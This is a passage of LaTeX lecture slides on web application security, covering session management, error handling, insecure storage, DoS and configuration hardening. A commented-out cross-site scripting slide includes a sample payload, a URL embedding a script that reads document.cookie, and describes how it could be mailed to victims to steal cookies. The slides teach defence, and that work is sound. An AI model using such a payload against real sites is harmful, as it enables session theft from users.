\begin{slide}{Broken~Authentication~and~Session~Management}
  To avoid these treats a web application should: 
  \begin{itemize}\itemsep=2ex
    \item Require to enter the login password on every management site.
    \item Require strong passwords.
    \item Implement a password change control.
    \item Store passwords as hash (whenever possible).
    \item Protect credentials and session ID in transit.
    \item Avoid browser caching.
  \end{itemize}
%  \structure{Why not switch to HTTPS (SSL)?}
\end{slide}
\end{printout}

\begin{frame}
  \frametitle{Broken Authentication and Session Management}
\begin{itemize}\itemsep=1.5ex
\item HTTP is a stateless protocol:\\
it does not ``remember'' previous requests
\item web applications must create and manage sessions
themselves
\item session data is
  \begin{itemize}
  \item stored at the server
  \item associated with a unique Session ID
  \end{itemize}
\item after session creation, the client is informed about the
session ID
\item the client attaches the session ID to each request
\end{itemize}
\end{frame}

\begin{frame}
  \frametitle{Broken Authentication and Session Management}
\begin{itemize}\itemsep=1.5ex
\item three possibilities for transporting session IDs
\item \alert<2->{encoding it into the URL as GET parameter}; has the
following drawbacks
\begin{itemize}
\item stored in referrer logs of other sites
\item caching; visible even when using encrypted connections
\item visible in browser location bar (bad for internet cafes...)
\end{itemize}
\item \alert<3->{hidden form fields}: only works for POST requests
\item \alert<4->{cookies}: preferable, but can be rejected by the client
\end{itemize}
\end{frame}

\begin{frame}
  \frametitle{Broken Authentication and Session Management}
Session attacks:
\begin{itemize}\itemsep=1.5ex
\item targeted at stealing the session ID
\item \textbf{Interception:} intercept request or response and extract session
  ID
\item \textbf{Prediction:} predict (or make a few good guesses about) the
  session ID
\item \textbf{Brute Force:} make many guesses about the session ID
\item \textbf{Fixation:} make the victim use a certain session ID
\item the first three attacks can be grouped into ``Session Hijacking''
attacks
\end{itemize}
\end{frame}


\begin{frame}[fragile]
  \frametitle{Broken Authentication and Session Management}
Preventing session attacks:
\begin{itemize}\itemsep=1.5ex
\item \textbf{Interception:}
\begin{itemize}
\item Use SSL for each request/response that transports a session ID (not only for login!)
\item This can be achieved by using the \lstinline|Strict-transport-security| HTTP Response header:
\begin{lstlisting}
    Strict-transport-security: max-age=10000000
\end{lstlisting}
possibly enabling SSL in all subdomains
\begin{lstlisting}
    Strict-transport-security: max-age=10000000; includeSubdomains
\end{lstlisting}
\end{itemize}
\item \textbf{Prediction:}
  \begin{itemize}
  \item make session IDs unpredictable by build them out of random numbers.
  \end{itemize}
\end{itemize}
\end{frame}


%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%% 

% %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%% 
% \begin{slide}{Cross-Site Scripting (XSS) 1/2}
%   \begin{itemize}\itemsep=2ex
%     \item The attacker tries to inject malicious code in well-known sites.\\
%           $\Longrightarrow$ Users will trust this code!
%     \item Assume we access \url{http://www.abcd.com/mypage.asp} and get:\\[1ex]
% \fbox{
% \begin{minipage}{.96\linewidth}
%   \centering
%   {\green \normalsize 
%       Sorry \url{http://www.abcd.com/mypage.asp} does not exist}
% \end{minipage}}
%     \item what happens, if we replace ``mypage.asp'' with a  malicious script?\pause
%     \item we get a page from a trusted site (www.abcd.com) with
%       malicious content,\pause
%       e.g:\\[1ex]
% \fbox{
% \begin{minipage}{.9\textwidth}
%   {\green\url{http://www.abcd.com/<script>alert(document.cookie);</script>}}
% \end{minipage}}
% \mbox{}\\[1ex]
%      which can be used to steal cookies!
% \end{itemize}
% \end{slide}
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
% \begin{slide}{Cross-Site Scripting (XSS) 2/2}
%   \begin{itemize}\itemsep=2ex
%     \item For example, we could mail this error page to our victim.
%     \item Our victim's browser will execute the script (from a trusted site).
%     \item More easy: copy malicious content into trusted message boards.
%   \end{itemize}
%   \begin{itemize}\itemsep=2ex
%     \item XSS can be used to steal session IDs of valid users.
%     \item XSS is a special form of unvalidated input attack.
%   \end{itemize}
% \end{slide}
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%

% \begin{slide}{Buffer Overflows}
%   \begin{itemize}\itemsep=2ex
%     \item Buffer overflows are caused by ``sending too much data''.
%     \item Buffer overflows corrupt the execution stack of the application.
%     \item Buffer overflows can occur in any software \\
%           \emph{worthy exception:} languages with runtime checking, e.g. Java.
%     \item To prevent buffer overflow attacks:
%     \begin{itemize}\itemsep=1.5ex
%       \item watch for bug reports and install patches timely.
%       \item program your own applications ``for safety''!
%     \end{itemize}
%     \item Overflow attacks are common for operating system attacks
%   \end{itemize}
% \end{slide}

%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
\begin{printout}
\begin{slide}{Improper Error Handling}
  \begin{itemize}
    \item Error messages reveal details about your application, especially if they
          contain stack traces, etc.
    \item Do not distinguish between ``file not found'' and ``access denied''.
    \item Your system should respond with short, clear error messages to the user.
    \item Execution failures could be a valuable input to the intrusion detection system.
  \end{itemize}
\end{slide}
\end{printout}
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
\begin{slide}{Insecure Storage}
  Using insecure storage can have many reasons:
  \begin{itemize}
    \item Storing critical data unencrypted. 
    \item Insecure storage of keys, certificates.
    \item Improper storage of secrets in memory.
    \item Poor choice of cryptographic algorithms.
    \item Poor sources of randomness.
    \item Attempts to invent ``new'' cryptography.
    \item No possibility to change keys during lifetime.
  \end{itemize}
\end{slide}
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
\begin{slide}{Preventing Insecure Storage}
  To prevent insecure storage:
  \begin{itemize}
    \item Minimize the use of encryption (``it's secure, it's encrypted'').
    \item Minimize the amount of stored data (e.g. hash instead of encrypt).
  \end{itemize}
  \begin{itemize}
    \item Choose well-known, reliable cryptographic implementations.
    \item Ensure that keys, certificates and password are stored securely.
    \item Split the master secret into pieces and built it only when needed.
  \end{itemize}
\end{slide}

\begin{frame}
  \frametitle{Disabling the Browser Cache}
  \begin{itemize}
  \item Add the following as part of your HTTP Response\\[1.5ex]
    Cache-Control: no-store, no-cache, must-revalidate\\
    Expires: -1
  \end{itemize}
\end{frame}



%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
\begin{slide}{Denial of Service}
  \begin{itemize}
    \item Beside network (e.g. SYN floods) also application level DoS.
    \item In principle: send as many HTTP requests you can.
    \item Today: tools for DoS available for everyone.
    \item Test your application under high load.
    \item Load balancing could help.
    \item Restrict number of requests per host/user/session.
  \end{itemize}
\end{slide}
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
\begin{printout}
\begin{slide}{Insecure Configuration Management}
  Maintaining software is a difficult problem and not web application 
  specific. You should 
  \begin{itemize}
    \item never run ``unpatched'' software.
    \item carefully look for server misconfigurations.
    \item remove all default accounts with default passwords.
    \item check the default configuration for pitfalls.
    \item remove unnecessary (default) files (e.g. default certificates).
    \item check for improper file and directory permissions.
    \item check for misconfiguration of SSL certificates.
  \end{itemize}
\end{slide}
\end{printout}
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
\section{Conclusion}
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
\begin{slide}{Conclusion}
  \begin{itemize}
    \item  Many security problems in practice are caused by
           the complexity of systems built, e.g.:
    \begin{itemize}
      \item by combining small systems into larger ones.
      \item by (slightly) incompatible implementations.
      \item complex configuration issues.
    \end{itemize}
    \item \alert{Remember:} systems are only as secure as the weakest link!
    \item Today, cryptography is difficult to crack,\\
       but (concrete) systems built are vulnerable.
    \item Most successful attacks build on programming and configuration errors.
  \end{itemize}
\end{slide}
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
\begin{slide}{Security Guidelines 1/2}
  \begin{itemize}
    \item Design:
    \begin{itemize}
      \item Keep it simple.
      \item Security by obscurity won't work.
      \item Use least privileges possible. 
      \item Separate privileges. 
    \end{itemize}
    \item Implementation:
    \begin{itemize}
      \item Validate input and output of your system.
      \item Don't rely on client-side validation.
      \item Fail securely.
      \item Use and reuse trusted components.
      \item Test your system (e.g. using attack tools).
    \end{itemize}
  \end{itemize}
\end{slide}
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
\begin{slide}{Security Guidelines 2/2}
  \begin{itemize}
    \item Additional techniques:
    \begin{itemize}
      \item You should not rely only on a ``standard'' firewall (filtering IPs 
            and ports):\\ 
            you have to filter carefully on the application level!
      \item Application level firewalls can help, but are not an all-in-one 
            solution.
      \item Apply intrusion detection.
    \end{itemize}
    \item Security issues are changing every day: keep up-to-date!
    \item Review your setup regularly!
  \end{itemize}
\end{slide}
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%\appendix
%\section{Appendix}
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
\begin{printout}
\begin{slide}{Further Reading}
{\small\begin{itemize}
\item William Stallings, \emph{Cryptography and Network Security}, Prentice Hall, 2003
\item The Open Web Application Security Project, \url{http://www.owasp.org}
\item The Ten Most Critical Web Application Security Vulnerabilities, OWASP, 2004, 
      \url{http://www.owasp.org/documentation/topten.html}
\item A Guide to Building Secure Web Applications: The Open Web Application Security Project, 
      OWASP, 2004, 
      \url{http://www.owasp.org/documentation/guide.html}
\item David Scott and Richard Sharp, \emph{Developing Secure Web Applications} in 
       IEEE Internet Computing. Vol. 6, no. 6. Nov/Dec 2002.
       \url{http://cambridgeweb.cambridge.intel-research.net/people/rsharp/publications/framework-secweb.pdf}
\item Frequently Asked Questions on Web Application Security, OWASP, 
      \url{http://www.owasp.org/documentation/appsec_faq.html}
\item \url{http://www.cert.org/}
\end{itemize}}
\end{slide}
\end{printout}

\bibliographystyle{alpha}
\bibliography{biblio}

\end{document}

%%% Local Variables: 
%%% mode: latex
%%% TeX-master: t
%%% End: 
